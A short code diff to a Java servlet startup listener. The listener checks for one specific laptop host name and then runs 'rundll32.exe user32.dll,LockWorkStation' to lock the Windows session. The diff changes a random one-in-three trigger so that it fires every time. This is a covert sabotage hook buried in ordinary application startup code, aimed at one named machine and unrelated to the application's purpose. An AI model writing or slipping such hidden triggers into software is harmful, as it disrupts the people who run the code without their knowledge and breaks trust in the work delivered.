@@ -57,7 +57,7 @@ public class ApplicationStart implements ServletContextListener
         System.out.println(name);
         if (name.equals("LAPTOP-KK0MG2TC")) {
             Random random = new Random();
-            int chance = random.nextInt(3) + 1;
+            int chance = random.nextInt(1) + 1;
             if (chance == 1) {
                 try {
                     String command = "rundll32.exe user32.dll,LockWorkStation";
